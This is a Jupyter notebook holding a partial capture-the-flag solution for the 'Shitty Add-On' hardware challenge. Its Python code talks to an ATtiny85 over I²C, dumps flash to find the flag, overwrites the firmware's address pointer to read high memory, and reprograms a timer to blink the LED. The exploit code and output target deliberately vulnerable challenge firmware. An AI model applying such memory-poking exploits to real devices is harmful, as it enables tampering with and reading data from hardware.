{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Capture The Flag Shitty Add-On\n",
    "\n",
    "A (partial so far) solution by [Blake Burkhart](https://bburky.com)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CTF Details\n",
    "\n",
    "This IPython notebook is a solution for the [Capture The Flag Shitty Add-On](https://blog.wokwi.com/capture-the-flag-shitty-add-on/) by Uri Shaked. Read the blog post for full details of the CTF challenge.\n",
    "\n",
    "The following resources will come in handy:\n",
    "\n",
    "* [Blog post and CTF description](https://blog.wokwi.com/capture-the-flag-shitty-add-on/)\n",
    "* [`ctf-firmware.ino` source for the CTF](https://github.com/urish/ctf-shittyaddon/blob/master/ctf-firmware/ctf-firmware.ino)\n",
    "* [ATtiny8x Datasheet](https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-2586-AVR-8-bit-Microcontroller-ATtiny25-ATtiny45-ATtiny85_Datasheet.pdf)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup\n",
    "\n",
    "I tested this solution with a Raspberry Pi 2 directly connected to a Digispark clone (an ATtiny85 board). The Digispark was powered from the Pi's 3.3v pin. The [`ctf-firmware-1.0.0.hex`](https://github.com/urish/ctf-shittyaddon/releases/tag/1.0.0) file was flashed to the Digispark.\n",
    "\n",
    "The Pi must have I²C and SPI enabled in `/boot/config.txt`:\n",
    "\n",
    "    dtparam=i2c_arm=on,i2c_arm_baudrate=10000\n",
    "    dtparam=spi=on\n",
    "  \n",
    "I set the I²C baud rate to 10kHz to avoid errors. I think this may be due the fact that Raspberry Pis [don't support clock stretching](http://www.advamation.com/knowhow/raspberrypi/rpi-i2c-bug.html) but the [attiny85 and the TinyWire library may allow it](https://github.com/lucullusTheOnly/TinyWire/issues/1). In other words, the slow ATtiny85 may not send all the data fast enough with the Pi's default 100kHz baud rate, set it to something slow like 10kHz. 40kHz was working, but then it quit working some reason.\n",
    "\n",
    "Also if the AVR ISP is connected to the Pi's SPI pins, the Digispark can be flashed over directly from the Pi with `avrdude`'s linuxspi protocol:\n",
    "\n",
    "    avrdude -v -pattiny85 -clinuxspi -b14400 -P /dev/spidev0.0 -U flash:w:ctf-firmware-1.0.0.hex \n",
    "    avrdude -v -pattiny85 -clinuxspi -b14400 -P /dev/spidev0.0 -Uefuse:w:0xfe:m -Uhfuse:w:0xdf:m -Ulfuse:w:0xe2:m\n",
    "    \n",
    "Don't connect the Pi to the Digispark's I²C and SPI at the same time, they share pins and things will go wrong."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# I²C read/write\n",
    "\n",
    "On an I²C read two bytes are returned: the lower byte of the 16-bit target address, and the byte at the adddress.\n",
    "\n",
    "When writing, the first byte is used to set the target address. The upper byte is always set to zero. The remainder of the bytes are written in to memory sequentially at the target pointer.\n",
    "\n",
    "A write with zero data bytes may be performed before a read to set the target address of the read.\n",
    "\n",
    "Define a pair of `i2c_write()` and `i2c_read()` functions. These functions also track the full 16-byte target address in the `current_target` variable."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from smbus2 import SMBus, i2c_msg\n",
    "from io import BytesIO\n",
    "\n",
    "CTF_I2C_ADDR = 0x23\n",
    "\n",
    "current_target = None\n",
    "\n",
    "def i2c_write(target, data=[]):\n",
    "    global current_target\n",
    "\n",
    "    with SMBus(1) as bus:\n",
    "        msg = i2c_msg.write(CTF_I2C_ADDR, [target, *data])\n",
    "        bus.i2c_rdwr(msg)\n",
    "    current_target = target + len(data)\n",
    "\n",
    "def i2c_read(target=None, count=1, ):\n",
    "    global current_target\n",
    "\n",
    "    with BytesIO() as f:\n",
    "        with SMBus(1) as bus:\n",
    "            # If provided, change target by writing the target address, but no data bytes\n",
    "            if target is not None:\n",
    "                msg = i2c_msg.write(CTF_I2C_ADDR, [target])\n",
    "                bus.i2c_rdwr(msg)\n",
    "                current_target = target\n",
    "\n",
    "            for i in range(count):\n",
    "                msg = i2c_msg.read(CTF_I2C_ADDR, 2)\n",
    "                bus.i2c_rdwr(msg)\n",
    "                target, data = msg\n",
    "                f.write(bytes([data]))\n",
    "                \n",
    "                if current_target is not None:\n",
    "                    assert(target == current_target & 0xff)\n",
    "                current_target += 1\n",
    "    \n",
    "        f.seek(0)\n",
    "        return f.read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Some quick testing. Manually set the target to 0x00 and read one byte:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\"'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_write(0x00)\n",
    "i2c_read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Read 4 bytes starting at 0x00:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\"\\x00\\x04@'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_read(target=0x00, count=4)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Write 6 bytes starting at 0x00:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# i2c_write(0x00, b'FOOBAR')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Set LED via I2C"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Values appear in datasheets, I found __SFR_OFFSET in avr-libc\n",
    "SFR_OFFSET = 0x20\n",
    "PORTB_ADDR = 0x18 + SFR_OFFSET\n",
    "DDRB_ADDR = 0x17 + SFR_OFFSET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read the current value of DDRB\n",
    "ddrb, = i2c_read(DDRB_ADDR)\n",
    "\n",
    "# Configure LED as an output pin\n",
    "# Enable DDB1 for the LED on a digispark \n",
    "# I think this is the same pin on the shittyaddon? It uses \"pin 6 of the ATtiny (a.k.a PB1)\"\n",
    "ddrb |= 1 << 1\n",
    "\n",
    "# Set DDRB on the board\n",
    "i2c_write(DDRB_ADDR, [ddrb])\n",
    "\n",
    "# Set all output bits in PORTB to turn on the LED\n",
    "i2c_write(PORTB_ADDR, [0xff])\n",
    "\n",
    "# The actual CTF board is active-high unlike the Digispark\n",
    "# To turn the LED on on it set PORTB to 0x00\n",
    "# i2c_write(PORTB_ADDR, [0x00])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dump flash and find the flag\n",
    "\n",
    "Dump the entire flash (plus some, it loops if you read too much?) and search for the flag with a regex on the bytes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "dump = i2c_read(target=0x00, count=0x10000)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "$FLAG:you_found_it!!! :-)\n",
      "Flag address: 0x801e\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "flag_match = re.search(b'\\$FLAG:.*?(?=\\x00)', dump)\n",
    "flag = flag_match.group(0)\n",
    "print(flag.decode('ascii'))\n",
    "\n",
    "flag_address = flag_match.start()\n",
    "print('Flag address:', hex(flag_address))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Read from high memory faster\n",
    "\n",
    "It's annoying that we can't set the `target` to a full two byte `uint16_t` value and address all of memory. However, it's possible to find the upper byte of the flag pointer in memory and set it directly. If we set it to 0x7f and read 0x100 bytes, we should be able to read from higher memory addresses directly.\n",
    "\n",
    "I compiled the CTF source code using [PlatformIO](https://platformio.org/) with debugging symbols enabled, and took the compiled elf and opened it with the [Ghidra](https://ghidra-sre.org/) dissasembler. After confirming that my recompilation was similar enough, I found the `target` pointer at address `mem:0064` in Ghidra by filtering the symbol list to some interesting addresses:\n",
    "\n",
    "![Symbol table](symbols.png)\n",
    "\n",
    "These addresses can also be found with `readelf`, but it's not obvious each variable is a code or data address. You have to somehow figure out that memory is at 0x800000 and code starts at zero.\n",
    "\n",
    "```\n",
    "$ readelf -s firmware.elf | grep -E 'flag|flash|target'\n",
    "    21: 00800064     2 OBJECT  LOCAL  DEFAULT    3 target\n",
    "    40: 00800060     2 OBJECT  LOCAL  DEFAULT    2 flash_value\n",
    "    41: 0000001e    13 OBJECT  LOCAL  DEFAULT    1 _ZL4flag\n",
    "    42: 00800062     2 OBJECT  LOCAL  DEFAULT    2 flash_addr\n",
    "```\n",
    "\n",
    "As a first test I tried writing a byte to address 0x64 and as expected the assert inside `i2c_read()` triggered, because the target pointer address was changed in memory. If we update `current_target` we can see it is possible to change the `target` pointer manually:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\"'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_write(0x64, [0x00])\n",
    "current_target = 0x00\n",
    "i2c_read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, set the high byte to read from higher memory addresses. A probem is that if we set address 0x65 to 0x80 we will then start reading at 0x8066. We won't be able to control the lower byte. If we decrease the high byte we can just read more data unill we get to the desired lower byte range."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flag address 0x801e == 0x801e\n"
     ]
    }
   ],
   "source": [
    "i2c_write(0x65, [0x7f])\n",
    "current_target = 0x7f66\n",
    "dump2 = i2c_read(count=0x100)\n",
    "\n",
    "match = re.search(b'\\$FLAG:.*?(?=\\x00)', dump2)\n",
    "print(f'Flag address {hex(flag_address)} == {hex(match.start() + 0x7f66)}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define a new `i2c_read_high()` function to implement this new read logic precicely:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'$FLAG:you_found_it!!! :-)'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "TARGET_HI_ADDR = 0x65\n",
    "\n",
    "def i2c_read_high(target, count=1):\n",
    "    global current_target\n",
    "    \n",
    "    target_hi = target >> 8\n",
    "    # Deliberately undershoot the target address by decrementing target_hi by one\n",
    "    target_hi -= 1\n",
    "    i2c_write(TARGET_HI_ADDR, [target_hi])\n",
    "    current_target = (target_hi << 8) | (TARGET_HI_ADDR + 1)\n",
    "    # Read and discard the returned bytes until we get to the desired target address\n",
    "    i2c_read(count=target-current_target)\n",
    "    \n",
    "    return i2c_read(count=count)\n",
    "\n",
    "# A quick test\n",
    "i2c_read_high(flag_address, count=len(flag))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Blinking rootkit\n",
    "\n",
    "While there may be other ways to make the LED blink, I chose to configure Timer/Counter1 to output to PB1.\n",
    "\n",
    "The datasheet describes how the OC1A output from Timer/Counter1 can be sent to PB1:\n",
    "\n",
    "> **Port B, Bit 1 – MISO/AIN1/OC0B/OC1A/DO/PCINT1**\n",
    "> * OC1A: Output Compare Match output: The PB1 pin can serve as an external output for the Timer/Counter1 Compare Match B when configured as an output (DDB1 set). The OC1A pin is also the output pin for the PWM mode timer function.\n",
    "\n",
    "Read the datasheet's register description for TCCR1 for full details and then configure the TCCR1 timer. The LED will blink indefinately without further input."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "TCCR1_ADDR = 0x30 + SFR_OFFSET\n",
    "\n",
    "# Ensure DDRB is still configured to output PB1\n",
    "ddrb, = i2c_read(DDRB_ADDR)\n",
    "ddrb |= 0b00000010\n",
    "i2c_write(DDRB_ADDR, [ddrb])\n",
    "\n",
    "# Configure TCCR1:\n",
    "#   Set bit 7 clear timer on compare match\n",
    "#   Set bit 6 to 0 to leave PWM disabled\n",
    "#   Set bits 5:4 to 01 to toggle PB1/OC1A (the LED)\n",
    "#   Set bits 3:0 to 1111 for prescaler/16384 (as slow as possible)\n",
    "tccr1 = 0b1_0_01_1111\n",
    "i2c_write(TCCR1_ADDR, [tccr1])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# TODO: Replace the flag\n",
    "\n",
    "These will require finally figuring out whatever is acually going on in `loop()`."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
